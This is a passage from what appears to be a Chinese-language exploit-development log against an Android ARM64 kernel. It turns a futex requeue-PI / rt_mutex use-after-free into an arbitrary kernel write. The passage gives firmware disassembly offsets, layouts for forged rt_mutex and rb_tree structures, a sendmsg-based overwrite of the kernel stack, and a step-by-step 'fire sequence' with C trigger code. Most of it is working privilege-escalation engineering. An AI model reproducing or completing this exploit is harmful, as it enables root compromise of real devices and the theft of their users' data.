		tmp = parent->rb_right;                   /* parent+0x08 <== 我们控制 */
		if (node == tmp) { ...左旋... }           /* 避免：让 parent->rb_right != node */
		WRITE_ONCE(gparent->rb_left, tmp);        /* *(gparent+0x10) = tmp      <== 任意写 #1 */
		WRITE_ONCE(parent->rb_right, node);
		if (tmp) rb_set_parent_color(tmp, gparent, RB_BLACK);   /* *(tmp) = gparent|1  <== 写 #2 */
		rb_set_parent_color(node, parent, RB_RED);
		break;
	}
```

⇒ 设 `gparent = TARGET - 0x10`、`parent->rb_right = VALUE`，得到
**`*(TARGET) = VALUE`**，附带 **`*(VALUE) = (TARGET - 0x10) | 1`**。
（第二次写要求 `VALUE` 可写——把它指向我们自己那页即可。）
同时必须满足 `*(TARGET - 0x08)` 为 0 或 BLACK（否则走 recolor 分支）。

### 14.6 涂 W 自己的栈，比涂 `P` 容易得多——而且 `rb_erase` 的陷阱可以绕过

`W_waiter` 在 **W 的内核栈**上（`SP0-0x190`，0x50 字节）。`rtmutex.c:664` 的
`rt_mutex_dequeue(lock, waiter)` 会检查 `RB_EMPTY_NODE(&waiter->tree_entry)`，
即 `waiter->tree_entry.__rb_parent_color == (unsigned long)&waiter->tree_entry`。
如果我们把这一片涂成垃圾，`RB_EMPTY_NODE` 为假 ⇒ 会去跑 `rb_erase_cached()`，
而 `rb_erase()` 会沿垃圾指针下降 ⇒ 崩。**但不必知道 `&W_waiter`：**

把 `W_waiter->tree_entry` 涂成 `{ __rb_parent_color = fake_parent, rb_right = 0, rb_left = 0 }`，
其中 `fake_parent` 是**我们自己那页里**的一个 8 字节对齐节点。代入
`__rb_erase_augmented()`（`lib/rbtree.c`）的第一个分支（`tmp == 0`）：

* `pc = node->__rb_parent_color = fake_parent`（偶数 ⇒ 非 BLACK）
* `parent = __rb_parent(pc) = fake_parent`
* `__rb_change_child(node, child = 0, fake_parent, root)`
  ⇒ 因为 `fake_parent->rb_left != node` 且 `fake_parent->rb_right != node`，
    它只会写 `fake_parent->rb_right = NULL`——**写在我们自己那页里**；
    而 `root->rb_node`（= `fake_lock+0x10`）**保持不动**。
* `child == 0` ⇒ `rebalance = __rb_is_black(pc) ? parent : NULL` = **NULL** ⇒ 不跑 `__rb_erase_color`。
* `rb_erase_cached()` 的前置 `if (root->rb_leftmost == node)`：我们设 `fake_lock+0x18 = 0` ≠ node ⇒ 跳过。

⇒ **`rt_mutex_dequeue` 变成对 `fake_lock+0x10` 完全无副作用的空操作**，
`685` 的下降起点（`fake_lock+0x10 = fake_w0`）得以保留。**这是 §12.5 没有解决的坑。**

### 14.7 从二进制实测的结构偏移（一律以二进制为准）

`firmware_extract/ap/boot_kernel.bin.elf`（`.kernel` VMA `0xffffff8008080000`）：

```
ffffff80081484bc <rt_mutex_init_waiter>:
  add x8, x0, #0x18 ; str x0, [x0] ; str xzr, [x0, #0x30] ; str x8, [x0, #0x18]
  ⇒ tree_entry @ +0x00 (RB_CLEAR_NODE)，pi_tree_entry @ +0x18 (RB_CLEAR_NODE)，task @ +0x30
     （注意：lock/prio/deadline 这里不初始化）

ffffff800814869c <__rt_mutex_init>:
  stp xzr,xzr,[x0,#0x18] ; str xzr,[x0,#0x10] ; stp x8(=0xFFFFFFFF00000000),x9(=0xFFFFFFFFFFFFFFFF),[x0]
  ⇒ wait_lock @ +0x00（16 字节），rb_root.rb_node @ +0x10，rb_leftmost @ +0x18，owner @ +0x20
     "未持有"的 16 字节编码 = 00 00 00 00 FF FF FF FF FF FF FF FF FF FF FF FF

ffffff80081486bc <rt_mutex_init_proxy_locked>:
  stp xzr,xzr,[x0,#0x10] ; stp x8,x9,[x0] ; ldr x8,[x0,#0x10] ; cset ne ; orr x8,x8,x1 ; str x8,[x0,#0x20]
  ⇒ rt_mutex_has_waiters() 读 +0x10（8 字节）；owner 写 +0x20

ffffff8009c1958c <_raw_spin_trylock>:
  ldr w8,[x0] ; cbnz w8, <fail>            <== 只读 +0x00 的 4 字节 val，val!=0 直接失败
  ldaxr w12,[x0] ; stxr w11,#1,[x0]        <== 4 字节 CAS 置 1
  <success>: str x9(=SP_EL0), [x0, #0x8]   <== 只写 +0x08
             str w10(=cpu),   [x0, #0x4]   <== 只写 +0x04
```

**⇒ 伪造 `struct rt_mutex` 只需 `+0x00..0x03 == 0`；`+0x04`/`+0x08` 会被 trylock 覆盖，无需理会。**
（`CONFIG_DEBUG_SPINLOCK`/`DEBUG_LOCK_ALLOC`/`PROVE_LOCKING` 在 `/proc/config.gz` 里都是 off，
但源码树的 `spinlock_types.h` 与二进制不一致——本工程早有记录，**以二进制为准**。）

### 14.8 为什么 `owner` 必须非 0：`owner == 0` 会唤醒 W 并触发 `futex.c:3341` 的空指针

`rtmutex.c:698` 之后：

```c
698	if (!rt_mutex_owner(lock)) {
704		if (prerequeue_top_waiter != rt_mutex_top_waiter(lock))
705			wake_up_process(rt_mutex_top_waiter(lock)->task);     /* <<< 会唤醒 W */
706		raw_spin_unlock_irq(&lock->wait_lock);
707		return 0;
708	}
```

而 W 一旦被唤醒并**不是**超时返回，就会走 `futex_wait_requeue_pi()` 的
`else`（`q.rt_waiter != NULL`）分支：

```c
3341		WARN_ON(!q.pi_state);
3342		pi_mutex = &q.pi_state->pi_mutex;      /* q.pi_state 已被 futex.c:2180 置 NULL ⇒ 解引用 0x10 */
```

`CONFIG_PANIC_ON_OOPS=y`（实测）⇒ 直接 panic 重启。
**⇒ 伪造的 `lock->owner` 必须非 0，且不能等于 W（否则 `rtmutex.c:600` 会以 `-EDEADLK` 提前退出，
写点根本到不了）。**

反过来，**W 通过「超时」返回是安全的**：`futex_wait_requeue_pi()` 在
`3299 ret = handle_early_requeue_pi_wakeup(...); 3301 if (ret) goto out_put_keys;`
——超时路径在这里就跳走了，**根本不会执行 3342**。

### 14.9 回收原语筛选结果（全部否掉，含理由）

| 候选 | 结论 | 理由 |
|---|---|---|
| `bind()` on `AF_UNIX`（`addr_len=88`） | **✗** | `struct unix_address` 的 `refcnt` 在 **+0x00** 且被内核置 1 ⇒ `_raw_spin_trylock` 读到 `val=1` ⇒ 失败 ⇒ `rtmutex.c:585` 无限 `retry`（软锁死） |
| `msg_msg` / `msg_msgseg` | **✗ 根本不存在** | **`# CONFIG_SYSVIPC is not set`**（设备实测） |
| `user_key_payload`（`add_key`） | **✗** | `data[]` 在 +0x12/+0x18 起，`+0x10` 被内核的 `datalen` 占掉 ⇒ `rb_node` 低位被强置 |
| `PR_SET_MM_AUXV` / `PR_SET_MM_MAP` | **✗** | `__arm64_sys_prctl+0x654`：`mov w0,#0x18; bl capable`（CAP_SYS_RESOURCE）⇒ `u:r:shell:s0`/uid 2000 拿不到，`-EPERM`，**拷贝根本不发生** |
| `memdup_user` 类 + userfaultfd 挂住 | **✗** | **`# CONFIG_USERFAULTFD is not set`**（设备实测） |
| `setxattr` 的 value 缓冲 | △ | 从 +0x00 起完全可控，但**瞬态**（syscall 内 `kfree`），无法在开火时保持存活 |

### 14.10 涂栈 syscall 的几何筛选（从二进制实测）

| syscall | 帧总量 | 用户可写缓冲位置 | 覆盖 `SP0-0x190..SP0-0x140`？ |
|---|---|---|---|
| `__arm64_sys_prctl` | `0x60 + 0x1a0 = 0x200` | `user_auxv = sp + 0x20 = SP0-0x1e0`，长 `0x178` | **✓ 完美覆盖**——但被 `capable(CAP_SYS_RESOURCE)` 挡住（§14.9） |
| `__arm64_sys_pselect6` + `core_sys_select` | `0xa0 + 0x1c0 = 0x260` | `stack_fds = SP0-0x210`，用户段只有 15 词（`n<=320` ⇒ `size<=40` ⇒ `3*size=120` 字节） | **✗ 差 8 字节**（用户段止于 `SP0-0x198`，waiter 起于 `SP0-0x190`） |
| `__arm64_sys_ppoll` + `do_sys_poll` | `0x60 + 0x3a0 = 0x400` | `stack_pps = sp + 0x60 = SP0-0x3a0`，entries 在 `+0xc`，长 `0xf0` | **✗ 差 0x210**（太深） |

`do_sys_poll` 实测片段（`0xffffff80082ea11c`）：

```
sub  sp, sp, #0x3a0
add  x21, sp, #0x60        ; x21 = stack_pps = SP0-0x3a0
str  xzr, [x21]            ; walk->next = NULL
str  w24, [x21, #0x8]      ; walk->len  = min(nfds, 30)
add  x23, x21, #0xc        ; x23 = walk->entries = stack_pps + 0xc
bl   __arch_copy_from_user ; copy_from_user(entries, ufds, len*8)  —— 无内容校验
```

**⇒ 需要的 syscall 是：总帧 ≤ ~0x1e0，且有一个 ≥0x50 字节的「用户→内核栈」裸拷贝
落到 `SP0-0x190`，并且随后**阻塞**（使涂写存活）。**
`PR_SET_MM_AUXV` 的几何是唯一已知满足的，可惜被能力位挡死。

### 14.11 下一步（精确、可执行）

1. **正式放弃**：pselect 涂栈（§13）、prefill `pi_state_cache`（§13.5）、回收 `P`（§13.6/§13.7）。
2. **改为「栈复用 UAF」路线**：
   a. 用现有 HOLD 构型把状态建立起来（`IONSTACK_ROUTE_HOLD=1`，requeue 返回 `-EDEADLK`）。
   b. **让 W 的 `FUTEX_WAIT_REQUEUE_PI` 走到超时**（`ROUTE_WAIT_SECONDS=8`），
      W 经 `handle_early_requeue_pi_wakeup()` → `out_put_keys` **安全返回**；
      此时 `W->pi_blocked_on` 仍指向 `SP0-0x190` —— **真正的 UAF 成立**。
   c. W 立刻进入一个「裸拷贝 + 阻塞」的 syscall，把
      `{ parent_color = fake_parent, rb_right = 0, rb_left = 0, ..., lock = fake_lock, prio = -1, deadline = 0xFFFFFFFF }`
      涂到 `SP0-0x190`。其中 `fake_lock`/`fake_parent`/`fake_w0` 都在已回收的 ION/SKB 页里（地址已知）。
   d. 消费者 `sched_setattr(W_tid, nice=1)` → `rt_mutex_adjust_pi(W)` → 链走 → 任意写。
3. **本轮新增的硬约束（实现时必须遵守）**：
   * `fake_lock+0x00`（4 字节）= 0；`+0x10 = fake_w0`；`+0x18 = 0`；`+0x20 = owner`（非 0、非 W）。
   * `fake_w0+0x00 = TARGET - 0x10`（偶数）；`fake_w0+0x08 = VALUE`；`fake_w0+0x10 = 0`；
     `fake_w0+0x40 (prio) > W->prio`（保证 685 的下降走左）。
   * `*(TARGET - 0x08)` 必须是 0 或 BLACK。
   * 涂写里 `prio` 取任何 ≠ `W->prio` 的值（如 `-1`）即可，**不再需要 M 的超时去-boost**。
   * 必须验证 `fake_lock` 的低 32 位与「fd 语义」不冲突（若用 `poll` 类 syscall）。

### 14.12 本轮结论汇总

| # | 旧结论 | 新结论（证据） |
|---|---|---|
| 1 | §13.5「预置 `pi_state_cache` ⇒ `kfree(P)`」 | **错。** `alloc_pi_state()`（`futex.c:1282`，经 2043 调用）在 2198 之前抽空 cache，分支无法翻转（§14.2） |
| 2 | §13.6/§13.7「回收 P」 | **放弃。** 唯一释放点是 `do_exit`（`exit.c:913`），与 rearm 互斥（§14.3） |
| 3 | §11/§12「`walk_reached_725=1` 是进展」 | **错。** 单节点树的根是 BLACK ⇒ `rb_insert_color` 立即 break ⇒ **零写**（§14.4） |
| 4 | §12.5「`rt_mutex_dequeue` 是安全空操作」 | **仅在 `RB_EMPTY_NODE` 为真时成立。** 涂栈后不成立，但可用 `{fake_parent,0,0}` 绕过（§14.6） |
| 5 | §6 B4「owner 用 0 可以」 | **错。** `owner == 0` ⇒ 唤醒 W ⇒ `futex.c:3341-3342` 空指针 ⇒ `PANIC_ON_OOPS` 重启（§14.8） |
| 6 | §7.3「用 `PR_SET_MM_MAP` 替代 pselect」 | **不可用。** `capable(CAP_SYS_RESOURCE)` 门（§14.9/§14.10） |
| 7 | — | **新：W 超时返回后 `W->pi_blocked_on` 是对 W 自己内核栈的 UAF，可被 W 的下一个阻塞型 syscall 重新涂写**（§14.1/§14.11） |

---

## 15. 第 15 轮（原语找到了）：`sendmsg` 的「双栈拷贝」正好覆盖整个 waiter

### 15.1 一句话

`sendmsg()` 的 `___sys_sendmsg()` 里有 **两处**「用户 → 内核栈」的裸拷贝，它们拼起来
**正好覆盖 `SP0-0x190` 起整个 `struct rt_mutex_waiter`（0x50 字节）**，而且 `sendmsg`
随后会**阻塞**（涂写得以存活）。`msg_namelen = 0x28` + **`msg_iovlen ≤ 5`** 就能精确涂到
`waiter->lock`（`waiter+0x38`）与 `waiter->prio`（`waiter+0x40`），同时**完整保留**
`waiter+0x00..0x28` 的残余 `RB_CLEAR_NODE`。**§14.10 的「找不到涂栈原语」不成立。**

### 15.2 几何实测（`firmware_extract/ap/boot_kernel.bin.elf`）

调用链：`__arm64_sys_sendmsg`（帧 `0x90`）→ `___sys_sendmsg`（帧 `0x190`）。

```
ffffff8009917cd4 <__arm64_sys_sendmsg>:
  sub  sp, sp, #0x90                 ; 帧 = 0x90
  ...
  mov  x2, sp                        ; x2 = msg_sys
  bl   0xffffff80099179fc            ; ___sys_sendmsg

ffffff80099179fc <___sys_sendmsg>:
  sub  sp, sp, #0x190                ; 帧 = 0x190
  ...
  add  x9,  sp, #0x38                ; iovstack = sp + 0x38
  sub  x10, x29, #0x88               ; x29 = sp + 0x140  ⇒  x10 = sp + 0xb8
  str  x9,  [sp, #0x8]               ; iov = iovstack
  str  x10, [x2]                     ; msg_sys->msg_name = &address (= sp+0xb8)
  ...
  bl   copy_msghdr_from_user         ; → move_addr_to_kernel + import_iovec
```

`SP0` = 进入 `__arm64_sys_*` 时的 sp。本轮用入口链**复核**了这个约定：

```
ffffff8008084580 <el0_svc>:            mov x0, sp ; bl el0_svc_handler   （无 sub sp）
ffffff800809b824 <el0_svc_handler>:    stp x29,x16,[sp,#-0x10]!  ⇒ 帧 0x10
ffffff800809b8b4 <el0_svc_common>:     stp x29,x16,[sp,#-0x40]!  ⇒ 帧 0x40
```
⇒ `SP0 = pt_regs - 0x10 - 0x40 = pt_regs - 0x50` ✓（与 §14 一致）

`___sys_sendmsg` 的 sp = `SP0 - 0x90 - 0x190 = SP0 - 0x220`，于是：

| 缓冲 | 帧内偏移 | 绝对地址 | 大小 | 用户可控性 |
|---|---|---|---|---|
| `ctl`（`unsigned char ctl[36]`） | `+0x10` | `SP0-0x210` | `0x24` | `msg_control`，仅当 `0 < controllen ≤ 0x24` |
| `iovstack[8]`（`struct iovec[8]`） | `+0x38` | `SP0-0x1e8` | `0x80` | **裸 `copy_from_user`** |
| `address`（`struct sockaddr_storage`） | `+0xb8` | `SP0-0x168` | `0x80` | **裸 `copy_from_user`** |

两处拷贝的源码（`net/socket.c` / `fs/read_write.c`，逐字）：

```c
/* ___sys_sendmsg —— 注意 msg_name 在拷贝之前就被指向栈上的 address */
	msg_sys->msg_name = &address;
	if (MSG_CMSG_COMPAT & flags)
		err = get_compat_msghdr(msg_sys, msg_compat, NULL, &iov);
	else
		err = copy_msghdr_from_user(msg_sys, msg, NULL, &iov);

/* copy_msghdr_from_user（save_addr == NULL ⇒ 走 move_addr_to_kernel） */
	kmsg->msg_namelen = msg.msg_namelen;
	if (!msg.msg_name) kmsg->msg_namelen = 0;
	if (kmsg->msg_namelen < 0) return -EINVAL;
	if (kmsg->msg_namelen > sizeof(struct sockaddr_storage))
		kmsg->msg_namelen = sizeof(struct sockaddr_storage);
	...
	if (msg.msg_name && kmsg->msg_namelen) {
		if (!save_addr) {
			err = move_addr_to_kernel(msg.msg_name, kmsg->msg_namelen,
						  kmsg->msg_name);
			if (err < 0) return err;
		}
	}
	...
	return import_iovec(WRITE, msg.msg_iov, msg.msg_iovlen,
			    UIO_FASTIOV, iov, &kmsg->msg_iter);

/* move_addr_to_kernel —— 只查 ulen 范围，内容零校验 */
int move_addr_to_kernel(void __user *uaddr, int ulen, struct sockaddr_storage *kaddr)
{
	if (ulen < 0 || ulen > sizeof(struct sockaddr_storage)) return -EINVAL;
	if (ulen == 0) return 0;
	if (copy_from_user(kaddr, uaddr, ulen)) return -EFAULT;
	return audit_sockaddr(ulen, kaddr);       /* audit_enabled==0 ⇒ 直接 0 */
}

/* rw_copy_check_uvector（import_iovec 的内核侧）—— 一次裸拷贝整个 iovec 数组 */
	if (copy_from_user(iov, uvector, nr_segs*sizeof(*uvector))) {
		ret = -EFAULT; goto out;
	}
```
**顺序**：`move_addr_to_kernel` 在前、`import_iovec` 在后；两者地址区间不重叠。

### 15.3 覆盖图（相对 waiter 基址 `SP0-0x190`）

| waiter 偏移 | 字段 | 谁写 | 要求 |
|---|---|---|---|
| `+0x00` | `tree_entry.__rb_parent_color` | **不写**（只有 `nr_segs ≥ 6` 时 `iov[5].iov_len` 才落到这里） | **必须保留残余 `= &waiter->tree_entry`** |
| `+0x08` | `tree_entry.rb_right` | 不写（`iov[6].iov_base`） | 残余 `= 0` |
| `+0x10` | `tree_entry.rb_left` | 不写（`iov[6].iov_len`） | 残余 `= 0` |
| `+0x18` | `pi_tree_entry.__rb_parent_color` | 不写（`iov[7].iov_base`） | **必须保留残余 `= &waiter->pi_tree_entry`** |
| `+0x20` | `pi_tree_entry.rb_right` | 不写（`iov[7].iov_len`） | 残余 `= 0` |
| `+0x28` | `pi_tree_entry.rb_left` | `address[0x00]` | 无所谓 |
| `+0x30` | `task` | `address[0x08]` | 链上不读（见 §15.5） |
| `+0x38` | **`lock`** | `address[0x10]` | **`= fake_lock`** ← 本轮目标 |
| `+0x40` | `prio` | `address[0x18]` | `0x7fffffff` |
| `+0x48` | `deadline` | `address[0x20]` | 无所谓 |

* `iovstack` 覆盖 `[SP0-0x1e8, SP0-0x168)` = `waiter-0x58 .. waiter+0x28`
* `address`（`msg_namelen = 0x28`）覆盖 `[SP0-0x168, SP0-0x140)` = `waiter+0x28 .. waiter+0x50`

**⇒ 拼起来正好是 `[waiter-0x58, waiter+0x50)`，waiter 本体 0x50 字节全覆盖。**

### 15.4 更正 A：`do_notify_resume` **只**覆盖 `waiter+0x30..waiter+0x50`

§13 与 `main.c:588` 说「`ret_to_user → do_notify_resume` 的 `0x1b0` 帧覆盖
`[SP0-0x1b0, SP0)`，waiter 被完整冲掉」。**实测推翻**：

```
ffffff8008084490 <ret_to_user>:
  ldr  x1, [x28] ; and x2, x1, #0x3f ; cbnz x2, 0xffffff8008084480 <work_pending>
ffffff8008084480 <work_pending>:
  mov  x0, sp                 ; x0 = pt_regs（work_pending 的 sp 就是 pt_regs）
  bl   0xffffff800808fe44 <do_notify_resume>
ffffff800808fe44 <do_notify_resume>:
  sub  sp, sp, #0x1b0         ; 帧 = 0x1b0，顶端 = pt_regs = SP0 + 0x50
```
⇒ `do_notify_resume` 实际覆盖 **`[pt_regs-0x1b0, pt_regs)` = `[SP0-0x160, SP0+0x50)`**。

与 waiter `[SP0-0x190, SP0-0x140)` 的交集只有 **`[SP0-0x160, SP0-0x140)` = `waiter+0x30..waiter+0x50`**。
**`waiter+0x00..0x28`（两个 `rb_node`）不会被冲掉**；而 `waiter+0x30..0x50`
恰好被 `address` 拷贝重涂。**⇒ 「让 W 超时返回」是可行的，不是死路。**

其余入口帧实测（都不碰 waiter）：

| 帧 | 大小 | 覆盖 |
|---|---|---|
| `syscall_trace_enter` | `0x30` | `[SP0-0x30, SP0)` |
| `defex_syscall_enter`（Samsung DEFEX，每次 syscall 必调） | `0x20` | `[SP0-0x20, SP0)` |
| `el0_svc_common` / `el0_svc_handler` | `0x40` / `0x10` | 同上量级 |
| `__arm64_sys_sendmsg` 寄存器保存区 | — | `[SP0-0x80, SP0-0x28)` |
| `___sys_sendmsg` 寄存器保存区 | — | `[SP0-0xe0, SP0-0x88)` |
| `___sys_sendmsg.ctl` | `0x24` | `[SP0-0x210, SP0-0x1ec)` |

### 15.5 更正 B：`task_to_waiter()` 是**复合字面量**，不是 `&task->rt_waiter`

```c
/* kernel/locking/rtmutex.c:227-231，逐字 */
/*
 * Only use with rt_mutex_waiter_{less,equal}()
 */
#define task_to_waiter(p)	\
	&(struct rt_mutex_waiter){ .prio = (p)->prio, .deadline = (p)->dl.deadline }
```
所以 `rt_mutex_waiter_equal(waiter, task_to_waiter(W))` 等价于
`waiter->prio == W->prio && waiter->deadline == W->dl.deadline`。
它出现在**两处**，且两处比较的是**同一对值**：

* `rt_mutex_adjust_pi()`（`rtmutex.c:1140`）——链的**入口门**
* `rt_mutex_adjust_prio_chain()` 的 `rtmutex.c:569` ——链内的**第二道门**

**⇒ 只要把 `waiter->prio` 涂成 `0x7fffffff`（`W->prio ≤ 139`，永不相等），两道门同时通过。**
`prio` 落在 `waiter+0x40`，被 `address` 拷贝覆盖 ⇒
**本轮不再依赖「消费者真的改变了 W 的优先级」。**
（注意 `rtmutex.c:682-683` 在 `rt_mutex_enqueue` **之前**会把 `waiter->prio/deadline` 覆写成
`W->prio` / `W->dl.deadline`，所以涂的 `prio` 只用于过门，不影响 685 的比较 ——
685 的比较用 `fake_w0->prio`，见 §15.11。）

### 15.6 更正 C：`__rb_insert()` Case 3 的真实写语义（§14.5 取自别的版本）

本内核 `lib/rbtree.c` 的 `__rb_insert()` 实际是：

```c
	gparent = rb_red_parent(parent);          /* parent->__rb_parent_color & ~3 */
	tmp = gparent->rb_right;                  /* *(gparent+0x08) */
	if (parent != tmp) {                      /* 走 rb_left 分支 */
		if (tmp && rb_is_red(tmp)) {          /* Case 1：必须避开 */
			rb_set_parent_color(tmp, gparent, RB_BLACK);
			rb_set_parent_color(parent, gparent, RB_BLACK);
			node = gparent; parent = rb_parent(node);
			rb_set_parent_color(node, parent, RB_RED);
			continue;
		}
		tmp = parent->rb_right;               /* *(parent+0x08) */
		if (node == tmp) { ... }              /* Case 2：必须避开 */
		/* Case 3 - right rotate at gparent */
		WRITE_ONCE(gparent->rb_left, tmp);    /* ★ *(gparent+0x10) = tmp */
		WRITE_ONCE(parent->rb_right, gparent);
		if (tmp)
			rb_set_parent_color(tmp, gparent, RB_BLACK);  /* ★ *(tmp) = gparent|1 */
		__rb_rotate_set_parents(gparent, parent, root, RB_RED);
		break;
	}
```
而 `__rb_rotate_set_parents(old=gparent, new=parent, root, RB_RED)`：

```c
	struct rb_node *parent = rb_parent(old);   /* = *(gparent) & ~3  —— 先读！ */
	new->__rb_parent_color = old->__rb_parent_color;
	rb_set_parent_color(old, new, color);      /* ★ *(gparent) = new */
	__rb_change_child(old, new, parent, root);
```
取 `gparent = TARGET - 0x10`（16 字节对齐 ⇒ `__rb_parent_color` 为偶数 ⇒ `rb_is_black()` 为假 ⇒ 继续），
`parent = fake_w0`、`fake_w0->tree_entry.rb_right = VALUE`、`fake_w0->tree_entry.rb_left = 0`：

**一次 `rb_insert_color` 的净效果（除自页内的写之外）：**

| 写 | 值 | 条件 |
|---|---|---|
| `*(TARGET - 0x10)` | `fake_w0` | 无条件（`rb_set_parent_color(old, new, RB_RED)`） |
| `*(TARGET)` | **`VALUE`** | 无条件（Case 3 的 `gparent->rb_left`） |
| `*(VALUE)` | `(TARGET-0x10) \| 1` | 若 `VALUE != 0` |
| `*(parent_)` | `fake_w0` | `parent_ = 原 *(TARGET-0x10) & ~3`；`parent_ == 0` 时改写 `*(fake_lock+0x10)`（自页，无害） |

**⇒ 原语是「以 `TARGET` 为锚写入 `VALUE`」，但**必然附带**写 `TARGET-0x10`。**
实践要求：`*(TARGET-0x10) == 0`（使 `parent_ = 0`，避免第四笔落到未知地址）、
`*(TARGET-0x08)` 为 0 或奇数（避开 Case 1）、`VALUE` 可写且 `VALUE ∉ {TARGET-0x10, &waiter->tree_entry}`。
**`TARGET` 必须落在「前 16 字节为 0」的可写内核地址上。**

### 15.7 为什么 `msg_iovlen` 必须 ≤ 5（§14.6 的绕过**不可能**）

`iov[5..7]` 分别落在 `waiter+0x00`、`waiter+0x08/0x10`、`waiter+0x18/0x20`。
而 `iov_len` 是 `rw_copy_check_uvector` 里要过 `access_ok(vrfy_dir(WRITE), buf, len)` 的**长度**，
`iov_base` 也是同一循环里要过 `access_ok` 的**用户地址** —— 二者都**不可能**是内核地址：
`__range_ok` 要求 `addr + size ≤ addr_limit`（`adds`/`sbcscc`/`cset lo`，无回绕可利用）。

⇒ 无法用 `iov[5].iov_len` 把 `tree_entry.__rb_parent_color` 写成 `&waiter->tree_entry`，
**也无法**按 §14.6 的方案把它写成「自页里的 `fake_parent`」。
唯一出路是 **`msg_iovlen ≤ 5`，完全不碰 `waiter+0x00..0x28`，让残余 `RB_CLEAR_NODE` 存活**
（§15.4 已证明 `do_notify_resume` 不会碰这一段）。

于是 `rtmutex.c:664` 的 `rt_mutex_dequeue()` 走
`if (RB_EMPTY_NODE(&waiter->tree_entry)) return;` —— **安全空操作**，
`fake_lock->waiters.rb_root.rb_node` 不被清掉，685 的下降得以成立。
**⇒ §14.6「用 `{fake_parent,0,0}` 绕过 `rb_erase`」作废，改为「保住残余 `RB_CLEAR_NODE`」。**

### 15.8 残余 waiter 为什么一定存在（`remove_waiter()` 的错位清空）

```c
/* kernel/locking/rtmutex.c:1797-1810 —— 在 **R** 的上下文里跑 */
int rt_mutex_start_proxy_lock(struct rt_mutex *lock,
			      struct rt_mutex_waiter *waiter,
			      struct task_struct *task)
{
	int ret;
	raw_spin_lock_irq(&lock->wait_lock);
	ret = __rt_mutex_start_proxy_lock(lock, waiter, task);
	if (unlikely(ret))
		remove_waiter(lock, waiter);      /* current == R，而 waiter->task == W */
	raw_spin_unlock_irq(&lock->wait_lock);
	return ret;
}
```
`remove_waiter()` 里写的是 `current->pi_blocked_on = NULL;`（应为 `waiter->task->pi_blocked_on = NULL;`）。
因为 `current == R != waiter->task == W`，**被清掉的是 R 的 `pi_blocked_on`，
W 的仍然指着 W 内核栈上的 `rt_waiter`**。
但同一函数里的 `rt_mutex_dequeue(lock, waiter)` / `rt_mutex_dequeue_pi(W, waiter)` 照常执行 ⇒
两个 `rb_node` 都回到 `RB_CLEAR_NODE`（`__rb_parent_color = 自身`）——
**这正是 §15.7 需要的残余状态**，也正是 `-EDEADLK` 分支（`ret != 0`）留下的东西。
（补充：超时路径上的 `rt_mutex_cleanup_proxy_lock()` 里 `remove_waiter()` 的
`current == W == waiter->task`，那一次是**正确**清空的；所以残余 waiter 只可能来自
`rt_mutex_start_proxy_lock()` 这一次，即 requeue 返回 `-EDEADLK` 的构型。）

### 15.9 `owner` 用「自己页里的 `fake_task`」

链在**写点之后**还会解引用 `owner`：

```c
	/* rtmutex.c:709-711 */
	task = rt_mutex_owner(lock);
	get_task_struct(task);            /* atomic_inc(&task->usage)  → +0x68 */
	raw_spin_lock(&task->pi_lock);    /* → +0x8c8 */
	...
	next_lock = task_blocked_on_lock(task);   /* task->pi_blocked_on → +0x8f8 */
```
所以 `fake_lock->owner` 必须指向一个**真实可写**的 `task_struct`。
`offset.h` 里现成的 `FAKE_TASK_OFF 0x3200` / `FAKE_TASK_PI_LOCK_OFF 0x8c8` 正是为此准备的：
把 `owner` 指向回收页内的 `fake_task`（`+0x8c8` 是清零的 `pi_lock`，`+0x8f8 = 0`
⇒ `task_blocked_on_lock()` 返回 NULL ⇒ `rtmutex.c:777` 干净退出），
**无需解析 `init_task`，也不会动到任何真实内核对象。**

### 15.10 完整开火序列（可执行）

1. 用现有 **HOLD 构型**建立状态：requeue 返回 `-EDEADLK`，即
   `rt_mutex_start_proxy_lock()` 走了 `if (unlikely(ret)) remove_waiter()` 那一条 ——
   残余 waiter 与「`W->pi_blocked_on` 仍然悬挂」**同时**成立（§15.8）。
2. W 的 `FUTEX_WAIT_REQUEUE_PI` 走到 `ROUTE_WAIT_SECONDS=8` 超时，
   经 `handle_early_requeue_pi_wakeup()` → `out_put_keys` **安全返回**；
   `ret_to_user` 可能调 `do_notify_resume`（只冲 `waiter+0x30..0x50`）。
3. W 立刻执行（**必须**是满发送缓冲上的阻塞 `sendmsg`）：

```c
	struct iovec iov[1] = {{ .iov_base = buf, .iov_len = 1 }};
	struct msghdr m = {
	    .msg_name    = paint,     /* 0x28 字节用户缓冲 */
	    .msg_namelen = 0x28,      /* ← 覆盖 waiter+0x28..0x50 */
	    .msg_iov     = iov,
	    .msg_iovlen  = 1,         /* ← 必须 ≤ 5，否则会冲掉 waiter+0x00..0x28 */
	    .msg_control = NULL, .msg_controllen = 0, .msg_flags = 0,
	};
	/* paint[0x00] = 0 (pi_tree_entry.rb_left)
	   paint[0x08] = 0 (task，链上不读)
	   paint[0x10] = fake_lock
	   paint[0x18] = 0x7fffffff (prio)
	   paint[0x20] = 0 (deadline) */
	sendmsg(sock, &m, 0);         /* 阻塞 ⇒ 帧与涂写保持存活 */
```
4. 消费者 `sched_setattr(W_tid, nice=…)` → `__sched_setscheduler()` →
   `if (pi) rt_mutex_adjust_pi(W)`（`kernel/sched/core.c:5212-5213`）
   → `rt_mutex_adjust_prio_chain(W, MIN_CHAINWALK, NULL, fake_lock, NULL, W)`：

   | 行 | 动作 | 本轮结论 |
   |---|---|---|
   | `1140` | 入口门 `rt_mutex_waiter_equal(waiter, task_to_waiter(W))` | 通过（`prio = 0x7fffffff ≠ W->prio`） |
   | `1145` | `next_lock = waiter->lock = fake_lock` | ✓ |
   | `537` | `next_lock != waiter->lock` 自洽 | ✓ |
   | `545` | `if (top_waiter)` —— `top_waiter = orig_waiter = NULL` | **整块跳过** |
   | `569` | 第二道门 | 通过（同上） |
   | `585` | `raw_spin_trylock(&fake_lock->wait_lock)` | 只需 `fake_lock+0x00`(4 字节) `== 0` |
   | `600` | `lock == orig_lock(NULL)` / `owner(fake_task) == top_task(W)` | 都不成立 ⇒ 不提前退 |
   | `661` | `prerequeue_top_waiter = rt_mutex_top_waiter(fake_lock) = fake_w0` | 需 `fake_lock+0x18 = fake_w0` 且 `fake_w0+0x38 = fake_lock`（`BUG_ON`） |
   | `664` | `rt_mutex_dequeue()` | **空操作**（残余 `RB_CLEAR_NODE`，§15.7） |
   | `682-683` | `waiter->prio = W->prio; waiter->deadline = W->dl.deadline` | 覆写涂的 `prio`（不影响 685） |
